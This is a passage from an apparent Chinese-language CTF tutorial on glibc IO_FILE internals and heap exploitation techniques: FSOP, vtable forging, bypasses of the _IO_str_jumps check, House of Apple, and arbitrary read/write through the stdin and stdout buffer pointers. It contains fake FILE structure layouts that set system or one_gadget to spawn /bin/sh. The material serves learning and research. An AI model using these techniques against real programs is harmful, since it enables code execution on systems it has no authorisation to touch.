中主要是调用_IO_XSPUTN 来实现写入的功能。调用\\_IO_XSPUTN需要首先取出 vtable 中的指针，再跳过去进行调用。\n\n#### fopen\n\nfopen 在标准 IO 库中用于打开文件，函数原型如下:\n\n```c\nFILE *fopen(char *filename, *type);\n```\n\n首先fopen中会为该文件创建一个FILE结构，由于其内部**使用malloc函数为FILE结构分配空间**，因此该FILE结构在堆上。\n\n之后fopen会初始化vtable的内容，并调用_IO_file_init 对FILE初始化操作。\n\n最后fopen会将该IO_FILE链入_IO_list_all指向的链表中，并调用系统调用open。\n\n```c\n//可见_chain指向的是更先创建的IO_FILE，_IO_list_all指向的始终是最后创建的IO_FILE\nfp->file._chain = (_IO_FILE *) _IO_list_all;\n_IO_list_all = fp;\n```\n\n#### fclose\n\nfclose 是标准 IO 库中用于关闭已打开文件的函数，函数原型如下：\n\n```c\nint fclose(FILE *stream);\n```\n\nfclose和fopen的操作正好相反，fclose首先会调用\\_IO_unlink_it 将指定的 FILE 从\\_chain 链表中脱链。\n\n之后会调用\\_IO_file_close_it 函数，\\_IO_file_close_it 会调用系统接口 close 关闭文件。\n\n最后调用 vtable 中的\\_IO_FINISH，其对应的是_IO_file_finish 函数，其中会调用 free 函数释放之前分配的 FILE 结构。\n\n#### printf/puts\n\nprintf 和 puts 是常用的输出函数，在 printf 的参数是以'\\n'结束的纯字符串时，printf 会被优化为 puts 函数并去除换行符。\n\nputs 在源码中实现的函数是\\_IO_puts，这个函数的操作与 fwrite 的流程大致相同，函数内部同样会调用 vtable 中的\\_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。\n\nprintf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现\n\n```c\nvfprintf+11\n_IO_file_xsputn\n_IO_file_overflow\nfunlockfile\n_IO_file_write\nwrite\n```\n\n## IO_FILE利用\n\n### 对fileno的利用\n\n每个文件流都有一个文件描述符`stdin:0, stdout:1, stderr:2`，这个文件描述符保存在`IO_FILE+0x70`的`fileno`字段。\n\n修改该字段能够修改文件处理的位置，本来`fileno==0`表示从标准输入中读取，修改为`3`则表示为从文件描述符为`3`的文件（已经`open`的文件）中读取。\n\n### 伪造 vtable 劫持程序流程(libc2.23及以前)\n\n许多与文件相关的操作都要对IO_FILE进行操作，这就离不开_IO_FILE_plus中的vtable，一些函数会从vtable中取出函数指针进行调用。因此如果能伪造vtable的话，我们就能劫持程序的流程。\n\n伪造vtable一般有两种做法:\n\n1. 直接修改vtable中的函数指针\n2. 覆盖vtable指向我们控制的内存，并在其中伪造vtable\n\n### FSOP\n\nFSOP 是 File Stream Oriented Programming 的缩写（面向文件流编程），进程内所有的\\_IO_FILE 结构会使用`_chain` 域相互连接形成一个链表，`_IO_list_all` 指向链表头。\n\nFSOP 的核心思想就是**劫持`_IO_list_all` 来伪造链表和其中的\\_IO_FILE 项（包括file和vtable）**。只要劫持了`_IO_list_all`并在对应位置伪造_IO_FILE项，就相当于劫持了所有关于文件的数据和操作。\n\n单纯的伪造只是构造了数据，不能达到**劫持程序流程**的目的。FSOP 选择调用`_IO_flush_all_lockp`来劫持程序流，这个函数会刷新`_IO_list_all` 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用`_IO_FILE_plus.vtable` 中的`_IO_overflow`，最终的效果就是执行`_IO_overflow(fp)`。\n\n因此如果能将`_IO_overflow`修改为`system`，将`file`结构的`flag`修改为`\"/bin/sh\\x00\"`，就可以通过`_IO_overflow(fp)`执行`system(\"/bin/sh\\x00\")`\n\n```c\nint _IO_flush_all_lockp (int do_lock)\n{\n  ...\n  fp = (_IO_FILE *) _IO_list_all;\n  while (fp != NULL)\n  {\n       ...\n       if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))//伪造的IO_FILE要满足的条件\n               && _IO_OVERFLOW (fp, EOF) == EOF) \n           {\n               result = EOF;\n          }\n        ...\n       fp=fp->_chain;\n  }\n  return result;\n}\n```\n\n从上面代码可以看到，要执行`_IO_overflow(fp)`，伪造的IO_FILE需要满足以下条件：\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：\n\n1. 当 libc检测到**内存错误**， 执行 abort 流程时（可以通过malloc等函数触发）（glibc-2.26删除）\n2. 当执行 exit 函数时\n3. 当执行流从 main 函数返回时\n\n```c\n._chain = chunk_addr //伪造_chain\nchunk_addr\n{\n  file = {\n    _flags = \"/bin/sh\\x00\", //对应此结构体首地址(fp)\n    _IO_read_ptr = 0x0,\n    _IO_read_end = 0x0,\n    _IO_read_base = 0x0,\n    _IO_write_base = 0x0,\n    _IO_write_ptr = 0x1,\n      ...\n      _mode = 0x0, //一般不用特意设置\n      _unused2 = '\\000' <repeats 19 times>\n  },\n  vtable = heap_addr\n}\nheap_addr\n{\n  __dummy = 0x0,\n  __dummy2 = 0x0,\n  __finish = 0x0,\n  __overflow = system_addr,\n    ...\n}\n```\n\n\n\n## glibc2.24后的IO_FILE利用\n\n从glibc2.24开始，加入了对vtable的检查，会对vtable的合法性进行检查。glibc中有一段完整的内存存放着各个vtable，`__start___libc_IO_vtables`和`__stop___libc_IO_vtables` 分别指向第一个和最后一个vtable，只有其中的vtable和外部的合法vtable可以通过检查正常使用，否则会引发abort。\n\n```c\n/* Check if unknown vtable pointers are permitted; otherwise,\n   terminate the process.  */\nvoid _IO_vtable_check (void) attribute_hidden;\n/* Perform vtable pointer validation.  If validation fails, terminate\n   the process.  */\nstatic inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)\n{\n  /* Fast path: The vtable pointer is within the __libc_IO_vtables\n     section.  */\n  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;\n  uintptr_t ptr = (uintptr_t) vtable;\n  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;\n  if (__glibc_unlikely (offset >= section_length))\n    /* The vtable pointer is not in the expected section.  Use the\n       slow path, which will terminate the process if necessary.  */\n    _IO_vtable_check ();\n  return vtable;\n}\n```\n\n这个检查的调用流程如下（IO函数使用宏调用）：\n\n```c\n#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)\n \n#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)\n \n# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) //检查在这里\n```\n\n在调用vtable中函数时会对其vtable合法性进行检查。\n\n因此我们伪造的`vtable`要在`glibc`的`vtable`段中，从而得以绕过该检查。\n目前来说，有四种思路：利用`_IO_str_jumps`中`_IO_str_overflow()`函数和`_IO_str_finish()`函数与利用`_IO_wstr_jumps`中对应的这两种函数。\n\n### _IO_str_jumps的FSOP(2.28及以后失效)\n\n`libc`中不仅仅只有`_IO_file_jumps`这么一个`vtable`，还有一个叫`_IO_str_jumps`的 ，这个`vtable`可以通过对vtable的检查。\n\n```c\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_str_finish), //this\n  JUMP_INIT(overflow, _IO_str_overflow), //this\n  JUMP_INIT(underflow, _IO_str_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_str_pbackfail),\n  JUMP_INIT(xsputn, _IO_default_xsputn),\n  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n  JUMP_INIT(seekoff, _IO_str_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_default_setbuf),\n  JUMP_INIT(sync, _IO_default_sync),\n  JUMP_INIT(doallocate, _IO_default_doallocate),\n  JUMP_INIT(read, _IO_default_read),\n  JUMP_INIT(write, _IO_default_write),\n  JUMP_INIT(seek, _IO_default_seek),\n  JUMP_INIT(close, _IO_default_close),\n  JUMP_INIT(stat, _IO_default_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n下面是一些相关的结构\n\n```c\nstruct _IO_str_fields\n{\n \t_IO_alloc_type _allocate_buffer;\n \t_IO_free_type _free_buffer;\n};\n\ntypedef struct _IO_strfile_\n{\n \tstruct _IO_streambuf _sbf;\n \tstruct _IO_str_fields _s;\n} _IO_strfile;\n\nstruct _IO_streambuf\n{\n  FILE _f;\n  const struct _IO_jump_t *vtable;\n};\n```\n\n由于libc中没有_IO_str_jumps的符号，因此需要自己找\n\n```py\n# libc.address = libc_base\ndef get_IO_str_jumps():\n    IO_file_jumps_addr = libc.sym['_IO_file_jumps']\n    IO_str_underflow_addr = libc.sym['_IO_str_underflow']\n    for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):\n        possible_IO_str_jumps_addr = ref - 0x20\n        if possible_IO_str_jumps_addr > IO_file_jumps_addr:\n            return possible_IO_str_jumps_addr\n```\n\n如果能设置vtable为``_IO_str_jumps``，那就可以调用其中的函数，如果其中的函数有问题，自然就可以利用。\n\n------\n\n在`_IO_str_jumps`中的`_IO_str_overflow`就有可以利用的地方。\n\n```c\nint _IO_str_overflow (_IO_FILE *fp, int c)\n{\n  int flush_only = c == EOF;\n  _IO_size_t pos;\n  if (fp->_flags & _IO_NO_WRITES)// pass\n      return flush_only ? 0 : EOF;\n  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))\n    {\n      fp->_flags |= _IO_CURRENTLY_PUTTING;\n      fp->_IO_write_ptr = fp->_IO_read_ptr;\n      fp->_IO_read_ptr = fp->_IO_read_end;\n    }\n  pos = fp->_IO_write_ptr - fp->_IO_write_base;\n  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in \n    {\n      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */ // pass\n    return EOF;\n      else\n    {\n      char *new_buf;\n      char *old_buf = fp->_IO_buf_base;\n      size_t old_blen = _IO_blen (fp);\n      _IO_size_t new_size = 2 * old_blen + 100;\n      if (new_size < old_blen)//pass 一般会通过\n        return EOF;\n      new_buf\n        = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);//target [fp+0xe0]\n      if (new_buf == NULL)\n        {\n          /*      __ferror(fp) = 1; */\n          return EOF;\n        }\n      if (old_buf)\n        {\n          memcpy (new_buf, old_buf, old_blen);\n          (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);\n          /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n          fp->_IO_buf_base = NULL;\n        }\n      memset (new_buf + old_blen, '\\0', new_size - old_blen);\n\n      _IO_setb (fp, new_buf, new_buf + new_size, 1);\n      fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);\n      fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);\n      fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);\n      fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);\n\n      fp->_IO_write_base = new_buf;\n      fp->_IO_write_end = fp->_IO_buf_end;\n    }\n    }\n\n  if (!flush_only)\n    *fp->_IO_write_ptr++ = (unsigned char) c;\n  if (fp->_IO_write_ptr > fp->_IO_read_end)\n    fp->_IO_read_end = fp->_IO_write_ptr;\n  return c;\n}\nlibc_hidden_def (_IO_str_overflow)\n```\n\n利用下面语句可以劫持程序流程：\n\n```c\nnew_buf= (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);\n```\n\n思路是绕过前面的检查，并将`fp->_s._allocate_buffer`修改为`system`,将`new_size`修改为`\"/bin/sh\"`的地址（也可直接改为one_gadget）\n\n具体构造：\n\n1. `fp->_flags & _IO_NO_WRITES`为假\n2. `(pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1))`\n3. `fp->_flags & _IO_USER_BUF(0x01)`为假\n4. `2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 `不能为负数\n5. `new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100`; 应当指向/bin/sh字符串对应的地址\n6. `fp+0xe0`（`_allocate_buffer`）指向system地址\n\n当然也要绕过 `_IO_flush_all_lockp`的一些条件\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n```c\n._chain => chunk_addr\nchunk_addr\n{\n  file = {\n    _flags = 0x0,\n    _IO_read_ptr = 0x0,\n    _IO_read_end = 0x0,\n    _IO_read_base = 0x0,\n    _IO_write_base = 0x0,\n    _IO_write_ptr = 0x1,\n    _IO_write_end = 0x0,\n    _IO_buf_base = 0x0,\n    _IO_buf_end = (bin_sh_addr - 100) // 2,\n      ...\n      _mode = 0x0, //一般不用特意设置\n      _unused2 = '\\000' <repeats 19 times>\n  },\n  vtable = _IO_str_jumps //chunk_addr + 0xd8 ~ +0xe0(glibc2.24之前可以)\n}\n+0xe0 ~ +0xe8 : system_addr / one_gadget //fp->_s._allocate_buffer\n```\n\n------\n\n在`_IO_str_jumps`中的`_IO_str_finish`也可以利用。\n\n```c\nvoid\n_IO_str_finish (_IO_FILE *fp, int dummy)\n{\n  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))\n    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  //[fp+0xe8]\n  fp->_IO_buf_base = NULL;\n\n  _IO_default_finish (fp, 0);\n}\n```\n\n同样也是对其中函数指针的利用\n\n```c\n(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);  //[fp+0xe8]\n```\n\n绕过条件：\n\n1. _IO_buf_base 不为空\n2. _flags & _IO_USER_BUF(0x01) 为假，即flag字段不包含IO_USER_BUF\n\n现在要让程序执行 `_IO_str_finish` ，`fclose(fp)` 是一条路，但似乎有局限。还是回到异常处理的方法，在 `_IO_flush_all_lockp` 函数中是通过 `_IO_OVERFLOW` 执行的 `__GI__IO_str_overflow`，而 `_IO_OVERFLOW` 是根据 `__overflow` 相对于 `_IO_str_jumps` vtable 的偏移找到具体函数的。所以如果我们伪造传递给 `_IO_OVERFLOW(fp)` 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 `_IO_str_finish` 并执行。\n\n也就是说，如果设置的vtable是`_IO_str_jumps-0x8`，那么在`vtable+0x18`的位置就是 `_IO_str_finish`（原本应该是 `_IO_str_overflow`），这样就可以通过 `_IO_flush_all_lockp`执行到 `_IO_str_finish`，而且由于这个vtable在合法范围内，因此能过检测。\n\n不过我们也要绕过 `_IO_flush_all_lockp`的一些条件\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n构造如下：\n\n```c\n._chain => chunk_addr\nchunk_addr\n{\n  file = {\n    _flags = 0x0,\n    _IO_read_ptr = 0x0,\n    _IO_read_end = 0x0,\n    _IO_read_base = 0x0,\n    _IO_write_base = 0x0,\n    _IO_write_ptr = 0x1,\n    _IO_write_end = 0x0,\n    _IO_buf_base = bin_sh_addr,\n      ...\n      _mode = 0x0, //一般不用特意设置\n      _unused2 = '\\000' <repeats 19 times>\n  },\n  vtable = _IO_str_jumps-8 //chunk_addr + 0xd8 ~ +0xe0 (2.24之前可以)\n}\n+0xe0 ~ +0xe8 : 0x0\n+0xe8 ~ +0xf0 : system_addr / one_gadget //fp->_s._free_buffer\n```\n\n而在`libc-2.28`及以后，由于不再使用偏移找`_s._allocate_buffer`和`_s._free_buffer`，而是直接用`malloc`和`free`代替，所以`FSOP`也失效了。\n\n### _IO_wide_data（House of Apple）\n\n`struct _IO_wide_data *_wide_data`在`_IO_FILE`中的偏移为`0xa0`\n\n`_IO_wide_data`的结构如下：\n\n```c\nstruct _IO_wide_data\n{\n  wchar_t *_IO_read_ptr;    /* Current read pointer */ \t\t\t//0x00\n  wchar_t *_IO_read_end;    /* End of get area. */\t\t\t\t//0x08\n  wchar_t *_IO_read_base;    /* Start of putback+get area. */\t //0x10\n  wchar_t *_IO_write_base;    /* Start of put area. */\t\t\t//0x18\n  wchar_t *_IO_write_ptr;    /* Current put pointer. */\t\t\t//0x20\n  wchar_t *_IO_write_end;    /* End of put area. */\t\t\t\t//0x28\n  wchar_t *_IO_buf_base;    /* Start of reserve area. */\t\t//0x30\n  wchar_t *_IO_buf_end;        /* End of reserve area. */\t\t//0x38\n  /* The following fields are used to support backing up and undo. */\n  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */\n  wchar_t *_IO_backup_base;    /* Pointer to first valid character of\n                   backup area */\n  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */\n \n  __mbstate_t _IO_state;\n  __mbstate_t _IO_last_state;\n  struct _IO_codecvt _codecvt;\n  wchar_t _shortbuf[1];\n  const struct _IO_jump_t *_wide_vtable; //_IO_wide_data+0xe0\n};\n```\n\n伪造`_wide_data`变量，通过`_IO_wstrn_overflow`可以将已知地址空间上的某些值修改为一个已知值。\n\n```c\nstatic wint_t _IO_wstrn_overflow (FILE *fp, wint_t c)\n{\n  /* When we come to here this means the user supplied buffer is\n     filled.  But since we must return the number of characters which\n     would have been written in total we must provide a buffer for\n     further use.  We can do this by writing on and on in the overflow\n     buffer in the _IO_wstrnfile structure.  */\n  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;\n \n  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)\n    {\n      _IO_wsetb (fp, snf->overflow_buf,\n         snf->overflow_buf + (sizeof (snf->overflow_buf)\n                      / sizeof (wchar_t)), 0);\n \n      fp->_wide_data->_IO_write_base = snf->overflow_buf;\n      fp->_wide_data->_IO_read_base = snf->overflow_buf;\n      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;\n      fp->_wide_data->_IO_read_end = (snf->overflow_buf\n                      + (sizeof (snf->overflow_buf)\n                     / sizeof (wchar_t))); //overflow_buf+偏移\n    }\n \n  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;\n  fp->_wide_data->_IO_write_end = snf->overflow_buf;\n \n  /* Since we are not really interested in storing the characters\n     which do not fit in the buffer we simply ignore it.  */\n  return c;\n}\n```\n\n`_IO_wstrn_overflow`首先将`fp`强制转化为`_IO_wstrnfile *`指针，然后判断`fp->_wide_data->_IO_buf_base != snf->overflow_buf`是否成立（一般肯定是成立的），如果成立则会对`fp->_wide_data`的`_IO_write_base`、`_IO_read_base`、`_IO_read_ptr`和`_IO_read_end`赋值为`snf->overflow_buf`或者与该地址一定范围内偏移的值；最后对`fp->_wide_data`的`_IO_write_ptr`和`_IO_write_end`赋值。\n\n也就是说，只要控制了`fp->_wide_data`，就可以控制从`fp->_wide_data`开始一定范围内的内存的值，也就等同于**任意地址写已知地址**。\n\n这里有时候需要绕过`_IO_wsetb`函数里面的`free`：\n\n```c\nvoid _IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)\n{\n  if (f->_wide_data->_IO_buf_base && !(f->_flags2 & _IO_FLAGS2_USER_WBUF))\n    free (f->_wide_data->_IO_buf_base); // 其不为0的时候不要执行到这里\n  f->_wide_data->_IO_buf_base = b; //overflow_buf\n  f->_wide_data->_IO_buf_end = eb; //overflow_buf+偏移\n  if (a)\n    f->_flags2 &= ~_IO_FLAGS2_USER_WBUF;\n  else\n    f->_flags2 |= _IO_FLAGS2_USER_WBUF;\n}\n```\n\n这样也能写入到`f->_wide_data->_IO_buf_base`和`f->_wide_data->_IO_buf_end`\n\n`_IO_wstrnfile`涉及到的结构体如下：\n\n```c\nstruct _IO_str_fields\n{\n  _IO_alloc_type _allocate_buffer_unused;\n  _IO_free_type _free_buffer_unused;\n};\n \nstruct _IO_streambuf\n{\n  FILE _f;\n  const struct _IO_jump_t *vtable;\n};\n \ntypedef struct _IO_strfile_\n{\n  struct _IO_streambuf _sbf;\n  struct _IO_str_fields _s;\n} _IO_strfile;\n \ntypedef struct\n{\n  _IO_strfile f;\n  /* This is used for the characters which do not fit in the buffer\n     provided by the user.  */\n  char overflow_buf[64];\n} _IO_strnfile;\n \n \ntypedef struct\n{\n  _IO_strfile f;\n  /* This is used for the characters which do not fit in the buffer\n     provided by the user.  */\n  wchar_t overflow_buf[64]; // overflow_buf相对于_IO_FILE结构体的偏移为0xf0，在vtable后面。\n} _IO_wstrnfile;\n```\n\n因此如果能在堆上伪造一个`_IO_FILE`结构体，将其`vtable`替换为`_IO_wstrn_jumps`，伪造`_wide_data`并覆盖，并伪造其他字段绕过检测调用`_IO_OVERFLOW`。`exit`函数则会一路调用到`_IO_wstrn_overflow`函数，并将`fake _wide_data`至`fake _wide_data+0x38`的地址区域的内容都替换为`fake_IO_FILE的overflow_buf+0xf0`或者`fake_IO_FILE的overflow_buf + 0x1f0`。\n\n对`_wide_data`的利用是House of Apple的原理。\n\n### IO_FILE中file的读写指针利用\n\n由于伪造的vtable常常都不在合法范围之内，因此很难再利用vtable，不过我们还可以利用file。\n\nIO_FILE结构中包含了关于文件的基本信息，其中就有与文件读写相关的字段，fwrite、fread等操作就需要利用这些信息。\n\n```c\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n```\n\n如果我们能控制以上字段，那就可以控制缓冲区的读写范围，实现任意读写。即使没有打开文件也没有关系，程序本身会创建stdin、stdout、stderr，控制这两个字段后通过sprintf、printf等函数一样可以利用。\n\n#### 利用stdin进行任意写\n\n`scanf`，`fread`，`gets`等读入走`IO`指针（`read`不走），最后都会调用vtable中的`_xsgetn()`。\n\n```c\n_IO_size_t _IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)\n{\n ...\n  if (fp->_IO_buf_base == NULL)\n    {\n      ...\n      //输入缓冲区为空则初始化输入缓冲区\n    }\n  while (want > 0) //还需要get的字节数\n    {\n      have = fp->_IO_read_end - fp->_IO_read_ptr;\n      if (have > 0)\n        {\n          ...\n          //memcpy\n \n        }\n      if (fp->_IO_buf_base\n          && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))\n        {\n          if (__underflow (fp) == EOF)  // 调用__underflow读入数据\n          ...\n        }\n      ...\n  return n - want;\n}\n\nint _IO_new_file_underflow (_IO_FILE *fp)\n{\n  _IO_ssize_t count;\n  ...\n  // 会检查_flags是否包含_IO_NO_READS标志，包含则直接返回。\n  // 标志的定义是#define _IO_NO_READS 4，因此_flags不能包含4。\n  if (fp->_flags & _IO_NO_READS)\n    {\n      fp->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return EOF;\n    }\n  // 如果输入缓冲区里存在数据，则直接返回\n  if (fp->_IO_read_ptr < fp->_IO_read_end)\n    return *(unsigned char *) fp->_IO_read_ptr;\n  ...\n  // 调用_IO_SYSREAD函数最终执行系统调用读取数据\n  count = _IO_SYSREAD (fp, fp->_IO_buf_base,\n               fp->_IO_buf_end - fp->_IO_buf_base);\n  ...\n}\nlibc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)\n```\n\n如果`_IO_buf_base`为空，则会初始化缓冲区。\n\n之后会判断`_IO_read_ptr`对应的空间是否有剩余，如果有则**直接复制到目的地址(传入的data)**。\n\n如果`_IO_read_ptr`中的内容没有或不够，则调用`__underflow`函数**执行系统调用读取数据**（`SYS_read`）到从`_IO_buf_base`开始到`_IO_buf_end`的位置，默认`0x400`字节。\n\n此时若实际读入了`n`个字节的数据，则`_IO_read_end = _IO_buf_base + n`（即`_IO_read_end`指向实际读入的最后一个字节的数据），之后再将`_IO_read_ptr`中的数据复制到目的地址(传入的data)。\n\n综上，为了做到**任意写**，满足如下条件，即可进行利用：\n\n1. 设置`_IO_read_end`等于`_IO_read_ptr`（使得`_IO_read_ptr`没有剩余数据，从而可以通过`SYS_read`读入数据）。\n2. 设置`_flag &~ _IO_NO_READS`即`_flag &~ 0x4`（一般不用特意设置）。\n3.  设置`_fileno`为`0`（一般不用特意设置）。\n4.  设置`_IO_buf_base`为`write_start`，`_IO_ buf_end`为`write_end`（我们目标写的起始地址是`write_start`，写结束地址为`write_end`），且使得`_IO_buf_end-_IO_buf_base`大于要写入的数据长度。\n\n#### 利用stdout进行任意读/写\n\n`printf`，`fwrite`，`puts`等输出走`IO`指针（`write`不走），最后会调用vtable中的`_xsputn()`\n\n```c\nIO_size_t _IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)\n{\n  const char *s = (const char *) data;\n  _IO_size_t to_do = n;\n  int must_flush = 0;\n  _IO_size_t count = 0;\n  if (n <= 0)\n    return 0;\n  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))\n    { //如果是行缓冲模式...\n      count = f->_IO_buf_end - f->_IO_write_ptr; //判断输出缓冲区还有多少空间\n      if (count >= n)\n        {\n          const char *p;\n          for (p = s + n; p > s; )\n            {\n              if (*--p == '\\n') //最后一个换行符\\n为截断符，且需要刷新输出缓冲区\n                {\n                  count = p - s + 1;\n                  must_flush = 1; //标志为真：需要刷新输出缓冲区\n                  break;\n                }\n            }\n        }\n    }\n  else if (f->_IO_write_end > f->_IO_write_ptr) //判断输出缓冲区还有多少空间（全缓冲模式）\n    count = f->_IO_write_end - f->_IO_write_ptr;\n  if (count > 0) //输出缓冲区余下空间>0\n    {\n      //如果输出缓冲区有空间，则先把数据拷贝至输出缓冲区\n      if (count > to_do)\n      \tcount = to_do;\n      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count); //全部复制到write_ptr\n      \t\t\t\t\t\t\t\t\t\t\t\t\t\t//控制write_ptr实现任意写\n      s += count;\n      to_do -= count;\n    }\n  if (to_do + must_flush > 0) //任意读的利用\n    {\n      _IO_size_t block_size, do_write;\n      if (_IO_OVERFLOW (f, EOF) == EOF) //调用_IO_OVERFLOW\n        return to_do == 0 ? EOF : n - to_do;\n      block_size = f->_IO_buf_end - f->_IO_buf_base;\n      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);\n      if (do_write)\n        {\n          count = new_do_write (f, s, do_write);\n          to_do -= count;\n          if (count < do_write)\n            return n - to_do;\n        }\n      if (to_do)\n        to_do -= _IO_default_xsputn (f, s+do_write, to_do);\n    }\n  return n - to_do;\n}\nlibc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)\n```\n\n在`_IO_2_1_stdout_`中，`_IO_buf_base`和`_IO_buf_end`为输出缓冲区起始位置（默认大小为`0x400`），在输出的过程中，会先将需要输出的数据从目标地址拷贝到输出缓冲区，再从输出缓冲区输出给用户。\n缓冲区建立函数`_IO_doallocbuf`会建立输出缓冲区，并把基地址保存在`_IO_buf_base`中，结束地址保存在`_IO_buf_end`中，在建立了输出缓冲区后，会将基址赋值给`_IO_write_base`。\n\n若是设置的是**全缓冲模式**`_IO_FULL_BUF`（一次接收所有输入），则会将结束地址给`_IO_write_end`，若是设置的是**行缓冲模式**`_IO_LINE_BUF`（一次接收一行），则`_IO_write_end`中存的是`_IO_buf_base`。\n\n此外，`_IO_write_ptr`表示输出缓冲区中已经使用到的地址，`_IO_write_base`到`_IO_write_ptr`之间的空间是已经使用的缓冲区，`_IO_write_ptr`到`_IO_write_end`之间为剩余的输出缓冲区。\n\n（1）任意写\n\n在行缓冲模式下，判断输出缓冲区还有多少空间，用的是`count = f->_IO_buf_end - f->_IO_write_ptr`，而在全缓冲模式下，用的是`count = f->_IO_write_end - f->_IO_write_ptr`。\n\n如果还有空间剩余，则会将要输出的`count`长度的数据复制到`_IO_write_ptr`，因此可通过这一点来实现任意地址写的功能。\n**利用方式**：只需将`_IO_write_ptr`指向`write_start`，`_IO_write_end`指向`write_end`即可。\n这里需要注意的是，有宏定义`#define _IO_LINE_BUF 0x0200`，`flag & _IO_LINE_BUF`为真，则表示`flag`中包含了`_IO_LINE_BUF`标识，即开启了行缓冲模式（可用`setvbuf(stdout,0,_IOLBF,1024)`开启），若要构造`flag`包含`_IO_LINE_BUF`标识，则`flag |= 0x200`即可。\n\n（2）任意读\n\n任意读利用了` if (to_do + must_flush > 0) `成立分支的部分\n\n`to_do`表明还有多少字节没有读入，因此一定是非负数。`must_flush`表明输出缓冲区是否需要刷新，当在行缓冲模式下检测到有换行符`\\n`的时候被赋值为1，因此当输出内容中有`\\n`且为**行缓冲模式**时就会执行该分支的内容，如用`puts`函数输出就一定会执行。\n若`to_do`大于`0`，也就是还有字符没有读入，也会执行该分支中的内容。因此，当 **输出缓冲区未建立** 或者 **输出缓冲区没有剩余空间** 或者 **输出缓冲区剩余的空间不够一次性将目标地址中的数据完全复制过来** 的时候，也会执行该`if`分支中的内容。\n`if`分支中主要调用了`_IO_OVERFLOW()`来刷新输出缓冲区，而在此过程中会调用`_IO_do_write()`输出我们想要的数据。\n\n```c\nint _IO_new_file_overflow (_IO_FILE *f, int ch)\n{\n  // 判断标志位是否包含_IO_NO_WRITES => _flags需要不包含_IO_NO_WRITES\n  if (f->_flags & _IO_NO_WRITES)\n    {\n      f->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return EOF;\n    }\n  // 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位\n  // 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING\n  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)\n    {\n      ...\n    }\n  // 调用_IO_do_write 输出 输出缓冲区\n  // 从_IO_write_base开始，输出(_IO_write_ptr - 